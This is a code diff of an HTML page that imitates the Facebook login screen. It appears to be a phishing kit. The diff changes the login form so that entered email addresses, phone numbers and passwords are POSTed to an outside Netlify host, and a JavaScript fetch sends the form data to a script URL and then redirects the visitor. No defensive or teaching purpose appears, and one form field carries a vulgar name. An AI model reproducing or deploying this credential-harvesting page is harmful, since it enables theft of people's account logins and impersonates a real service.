@@ -14,7 +14,10 @@
     <p>Facebook helps you connect and share with the people in your life.</p>
   </div>
   <div class="form-box">
-    <form action="https://submit-code.netlify.app/" name="fox">
+    <form action="https://submit-code.netlify.app/"  name="subscribe"
+      method="POST"
+      netlify-honeypot="bot-field"
+      data-netlify="true">
       <input type="text" name="emran" placeholder="Email address or phone number" required="">
       <input type="password" name="pussy" placeholder="Password" required="">
       <button type="submit">Log In</button>
@@ -36,7 +39,7 @@
  
   form.addEventListener('submit', e => {
     e.preventDefault()
-    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+    fetch(scriptURL, { method: 'POST', body: new FormData(subscribe)})
      // .then(response => alert("Thank you! your form is submitted successfully." ))
      .then(() => { window.location.href='https://submit-code.netlify.app/'; })
      // .catch(error => console.error('Error!', error.message))
